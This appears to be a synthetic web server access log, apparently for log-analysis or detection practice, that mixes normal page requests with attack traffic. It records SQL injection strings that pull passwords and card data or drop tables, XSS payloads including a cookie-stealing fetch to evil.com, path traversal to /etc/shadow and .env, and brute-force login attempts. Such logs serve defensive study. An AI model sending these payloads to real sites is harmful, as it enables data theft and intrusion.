192.168.1.10 - - [01/Apr/2026:10:00:01 +0530] "GET /index.html HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.10 - - [01/Apr/2026:10:00:05 +0530] "GET /about.html HTTP/1.1" 200 3842 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:00:08 +0530] "GET /contact.html HTTP/1.1" 200 2950 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
10.0.0.5 - - [01/Apr/2026:10:00:12 +0530] "POST /contact HTTP/1.1" 200 128 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
172.16.0.3 - - [01/Apr/2026:10:00:15 +0530] "GET /products HTTP/1.1" 200 8400 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
172.16.0.3 - - [01/Apr/2026:10:00:18 +0530] "GET /services HTTP/1.1" 200 4200 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
192.168.1.10 - - [01/Apr/2026:10:00:22 +0530] "GET /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:00:28 +0530] "GET /search?q=shoes HTTP/1.1" 200 6100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
203.0.113.42 - - [01/Apr/2026:10:01:01 +0530] "GET /search?q=' OR 1=1 -- HTTP/1.1" 200 6100 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:01:04 +0530] "GET /login?user=admin' OR 1=1 -- HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:01:08 +0530] "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:01:12 +0530] "POST /search?q=' UNION SELECT credit_card FROM orders HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:01:15 +0530] "GET /api/data?filter=' OR 1=1; DROP TABLE users -- HTTP/1.1" 500 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
10.0.0.5 - - [01/Apr/2026:10:01:20 +0530] "GET /dashboard HTTP/1.1" 200 7200 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
172.16.0.3 - - [01/Apr/2026:10:01:25 +0530] "GET /faq HTTP/1.1" 200 3400 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
198.51.100.77 - - [01/Apr/2026:10:02:01 +0530] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
198.51.100.77 - - [01/Apr/2026:10:02:05 +0530] "GET /profile?name=<script>document.cookie</script> HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
198.51.100.77 - - [01/Apr/2026:10:02:09 +0530] "POST /comment?body=<script>alert(1)</script> HTTP/1.1" 200 256 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
198.51.100.77 - - [01/Apr/2026:10:02:13 +0530] "GET /redirect?url=javascript:alert(document.domain) HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
198.51.100.77 - - [01/Apr/2026:10:02:17 +0530] "GET /feedback?msg=<script>fetch('https://evil.com/steal?c='+document.cookie)</script> HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
192.168.1.10 - - [01/Apr/2026:10:02:20 +0530] "GET /blog HTTP/1.1" 200 9500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:02:25 +0530] "GET /pricing HTTP/1.1" 200 4300 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
10.20.30.99 - - [01/Apr/2026:10:03:01 +0530] "GET /../../etc/passwd HTTP/1.1" 403 1024 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
10.20.30.99 - - [01/Apr/2026:10:03:05 +0530] "GET /../../../etc/shadow HTTP/1.1" 403 1024 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
10.20.30.99 - - [01/Apr/2026:10:03:09 +0530] "GET /files/../../../secret/config.yml HTTP/1.1" 403 1024 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
10.20.30.99 - - [01/Apr/2026:10:03:13 +0530] "GET /download?file=../../../var/log/auth.log HTTP/1.1" 200 8192 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
10.20.30.99 - - [01/Apr/2026:10:03:17 +0530] "GET /assets/../../.env HTTP/1.1" 403 512 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
172.16.0.3 - - [01/Apr/2026:10:03:20 +0530] "GET /blog/post-1 HTTP/1.1" 200 6700 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
192.168.1.10 - - [01/Apr/2026:10:03:25 +0530] "POST /newsletter HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:03:30 +0530] "GET /careers HTTP/1.1" 200 5100 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
45.33.32.156 - - [01/Apr/2026:10:04:01 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:03 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:05 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:07 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:09 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:11 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:13 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:15 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:17 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:04:19 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
203.0.113.42 - - [01/Apr/2026:10:04:22 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:04:24 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:04:26 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:04:28 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
203.0.113.42 - - [01/Apr/2026:10:04:30 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
192.168.1.10 - - [01/Apr/2026:10:04:35 +0530] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:04:38 +0530] "GET /api/users HTTP/1.1" 403 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
172.16.0.3 - - [01/Apr/2026:10:04:42 +0530] "POST /upload HTTP/1.1" 500 256 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
10.20.30.99 - - [01/Apr/2026:10:04:45 +0530] "GET /api/config HTTP/1.1" 500 128 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
192.168.1.10 - - [01/Apr/2026:10:05:01 +0530] "GET /images/logo.png HTTP/1.1" 200 24576 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.10 - - [01/Apr/2026:10:05:05 +0530] "GET /css/style.css HTTP/1.1" 200 8192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
10.0.0.5 - - [01/Apr/2026:10:05:08 +0530] "GET /js/app.js HTTP/1.1" 200 16384 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
172.16.0.3 - - [01/Apr/2026:10:05:12 +0530] "GET /blog/post-2 HTTP/1.1" 200 7200 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
172.16.0.3 - - [01/Apr/2026:10:05:16 +0530] "GET /blog/post-3 HTTP/1.1" 200 5800 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
10.0.0.5 - - [01/Apr/2026:10:05:20 +0530] "GET /support HTTP/1.1" 200 3900 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
192.168.1.10 - - [01/Apr/2026:10:05:25 +0530] "GET /terms HTTP/1.1" 200 4100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
192.168.1.10 - - [01/Apr/2026:10:05:30 +0530] "GET /privacy HTTP/1.1" 200 3800 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
203.0.113.42 - - [01/Apr/2026:10:05:35 +0530] "GET /admin?user=1 UNION SELECT * FROM sessions HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
198.51.100.77 - - [01/Apr/2026:10:05:40 +0530] "GET /page?content=<script>window.location='https://evil.com'</script> HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
10.20.30.99 - - [01/Apr/2026:10:05:45 +0530] "GET /logs/../../../proc/self/environ HTTP/1.1" 403 512 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
45.33.32.156 - - [01/Apr/2026:10:05:50 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
45.33.32.156 - - [01/Apr/2026:10:05:52 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
10.0.0.5 - - [01/Apr/2026:10:06:01 +0530] "GET /index.html HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
192.168.1.10 - - [01/Apr/2026:10:06:05 +0530] "GET /sitemap.xml HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.3 - - [01/Apr/2026:10:06:10 +0530] "GET /robots.txt HTTP/1.1" 200 128 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
203.0.113.42 - - [01/Apr/2026:10:06:15 +0530] "GET /search?q=test' OR 1=1 -- HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
198.51.100.77 - - [01/Apr/2026:10:06:20 +0530] "GET /form?input=<script>alert('stored-xss')</script> HTTP/1.1" 200 256 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)"
10.20.30.99 - - [01/Apr/2026:10:06:25 +0530] "GET /static/../../../etc/hosts HTTP/1.1" 403 512 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"
45.33.32.156 - - [01/Apr/2026:10:06:30 +0530] "POST /login HTTP/1.1" 401 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
10.0.0.5 - - [01/Apr/2026:10:06:35 +0530] "GET /help HTTP/1.1" 200 3200 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109"
192.168.1.10 - - [01/Apr/2026:10:06:40 +0530] "GET /status HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
172.16.0.3 - - [01/Apr/2026:10:06:45 +0530] "POST /api/feedback HTTP/1.1" 200 128 "-" "Safari/16.2 (Macintosh; Intel Mac OS X 13_1)"
